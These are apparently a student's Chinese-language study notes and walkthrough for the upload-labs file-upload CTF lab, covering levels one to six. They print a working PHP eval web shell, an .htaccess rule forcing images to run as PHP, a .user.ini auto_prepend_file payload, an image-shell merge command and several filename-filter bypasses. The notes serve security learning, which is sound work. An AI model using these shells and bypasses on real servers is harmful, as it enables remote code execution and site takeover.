---
title: upload-labs
categories:
  - 学习
tags:
  - 文件上传
  - WP
abbrlink: 80f02bc5
---

**一句话木马**

`<?php @eval($_POST['a']);?> (常用)`

### 如何判断校验是前端还是后端

方法：上传时启用bp抓包，点击上传php文件之后，如果页面弹出提示“禁止php文件”，而bp没有抓到数据包，那么说明校验是在前端，可以通过bp抓包修改后缀来绕过

### CTF中的常见考法

1. **绕过前端验证**
   - 直接篡改HTTP请求，修改`Content-Type`（如`image/jpeg`）或文件后缀名（如`.php5`、`.phtml`）。
2. **绕过服务端检查**
   - **文件头欺骗**：在PHP文件开头加入图片的魔术字（如`GIF89a`）绕过内容检测。
   - **双写后缀**：如`shell.php.jpg` → 部分过滤逻辑可能删去最后一个后缀，保留`.php`。
   - **大小写绕过**：尝试`.PhP`或`.pHp`绕过黑名单。
3. **配合其他漏洞**
   - **文件包含漏洞**：上传一个非可执行文件（如图片马），通过Local File Inclusion（LFI）触发执行。
   - **.htaccess利用**：上传自定义的`.htaccess`文件，强制将特定后缀（如`.txt`）解析为PHP。
4. **非Webshell解法**
   - **直接泄露Flag**：题目可能要求上传文件后，通过路径访问直接读取上传内容中的Flag。
   - **逻辑漏洞**：例如上传时修改参数实现目录穿越（`../../flag.txt`）。

```php
if (isset($_POST['submit']))//检查表单是否通过 POST 方法提交，并且名为 submit 的按钮被点击。
	{
    if (file_exists(UPLOAD_PATH))//验证服务器上指定的上传目录（UPLOAD_PATH）是否存在，确保文件可以被正确保存。
    {
        $deny_ext = array('.asp','.aspx','.php','.jsp');//定义了一个黑名单数组，包含禁止上传的扩展名（如 .asp, .php 等），主要用于阻止常见的服务器脚本文件上传。
        $file_name = trim($_FILES['upload_file']['name']);//1.获取上传文件的原始名称，并移除其首尾的空格，防止通过空格绕过检测。
        $file_name = deldot($file_name);//2.删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');//3.用 strrchr() 获取文件名中最后一个点（.）后的字符串，即提取文件扩展名（如 .php）。
        $file_ext = strtolower($file_ext); //4.将扩展名转换为小写，避免大小写绕过（例如 .PHP 或 .Php 被统一处理为 .php）。
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除扩展名中的 ::$DATA 字符串（不区分大小写），这是针对 Windows 系统的特性，防止利用 NTFS 数据流绕过（例如 file.php::$DATA 被解析为 file.php）。
        $file_ext = trim($file_ext); //再次移除扩展名首尾的空格，确保没有隐藏的空格干扰检测。
        
    if(!in_array($file_ext, $deny_ext)) // 如果后缀名不在黑名单之中，可以执行
    {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;  //上传路径和$file_ext后缀拼接
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

**概括**

对文件名的操作：

1. 删除末尾的点
2. 转为小写
3. 去空
4. 判断

### 第一关

方法一：

因为是前端校验，所以可以用bp抓包，修改后缀

方法二：

发现前端是使用js校验，那么可以禁用js，再上传文件

~~方法三：(似乎不行)~~

修改前端校验，直接将`return check()（校验函数）`改为`true`

### 第二关

发现是后端校验，于是第一题用的方法都不行了。

删掉`content-type`，再发包，发现上传不成功。说明后端校验（也可能是之一）是通过`content-type`来判断 的，那么可以修改`content-type:`为图片的形式进行绕过

### 第三关

第三关的代码逻辑是黑名单过滤了`.asp`、`.aspx`、`.php`、`.jsp`等扩展名，并对文件名进行了处理（删除末尾的点、转换为小写等）。

### 第四关

使用黑名单绕过，但是没有过滤`.htacccess,httpd.conf`

#### 配置文件

![image-20250408111206398](https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250408111206398.png)

**`.htaccess`**文件作用范围局限，通常位于网站根目录或特定目录中，并只影响该目录和其子目录。每个目录都可以有自己的`.htaccess`文件

可以通过文本编辑器直接进行修改或创建，且修改后会即时生效，无需重启

**`httpd.conf`**文件作用范围广泛，是Apache的主配置文件，影响整个服务器

通常需要管理员级别的权限进行修改，修改后需要重启服务器才能生效

#### .htaccess绕过

因此可以通过上传后缀名为`.htaccess`文件进行绕过

文本内容`AddType application/x-httpd-php .jpg .txt`（增加要求将.jpg .txt 以.php形式解析）

上传成功之后，再将包含一句话木马的文件后缀名改成.jpg后缀上传，上传成功后，再通蚁剑连接

**终端生成图片命令**

`copy 1.php（php文件）+2.jpg（jpg文件）/b 3.jpg（新的jpg文件，用记事本打开可发现包含php和jpg的内容，用jpg打开是正常的图片）`

### 第五关

#### 前置知识

`.htaccess`

**作用：**分布式配置文件，一般用于URL重写，认证，访问控制等

**作用范围：**特定目录及其子目录

**优先级：** **较高**，可覆盖Apache的主要配置文件(httpd-conf)

**生效方式：**修改后立刻生效

`httpd-conf`

**作用：**包含Apache HTTP服务器的全局行为和默认设置

**作用范围：** 整个服务器

**优先级：** 较低

**生效方式：**管理员权限，重启服务器后生效

`.user.ini`

**作用：**特定于用户或特定目录的配置文件，通常位于Web应用程序的根目录，用于覆盖或追加全局配置文件(如php.ini)中的PHP配置选项

**作用范围：**存放该文件的目录及其子目录

**优先级：** **较高**，可以覆盖php.ini

**生效方式：** 立即生效

**生效前提：**

PHP版本大于5.3.0，最好使用7.x版本

`ServerAPI为CGI/FastCGI(可通过Phpinfo()查看)`

**文件上传漏洞前提：**

`.user.ini`可以生效，并且**该上传目录有php文件**

`php.ini`

**作用：** 存储了对整个PHP环境生效的配置选项，通常位于PHP安装目录中

**作用范围：** 所有运行在该PHP环境中的PHP请求

**优先级：** 较低

**生效方式：**重启php或web服务器

**加载方式：** 首先加载`php.ini/httpd-conf `文件中的配置。然而，如果在某个目录下存在 `.user.ini/.htaccess`文件，服务器会在处理请求时检查该目录，并覆盖相应的配置项

#### .user.ini绕过

两个文件：

一个是php文件但是后缀改成jpg（进行 绕过），另一个是.user.ini。

```php
1.php(后缀改成jpg)
<?php
@eval($_POST['a']);
echo"包含成功<br/>"
?>

.user.ini
auto_prepend_file=1.jpg 
//使每次进行访问时，都会对1.jpg文件进行加载,使得一句话木马可以执行
//auto_prepend_file 是 PHP 的一个配置指令，它会让指定的文件（这里是 1.jpg）在每个 PHP 脚本执行前自动被包含进来。如此一来，即便访问的不是 1.jpg 文件，服务器也会先执行 1.jpg 里的代码，也就是执行那个一句话木马。
```

#### 点加空格加点绕过

如果对文件名的操作：

1. 删除末尾的点

2. 转为小写

3. 去空

4. 判断

5. ```php
    $img_path = UPLOAD_PATH.'/'.$file_name; //路径直接拼接文件名       
   ```

抓包把名字改为`1.php. .`

### 第六关

相比之前少了转为小写的部分，所以可以用大小写绕过

~~windows对于后缀会自动解析为小写，php改为PhP绕过过滤后会被正常执行~~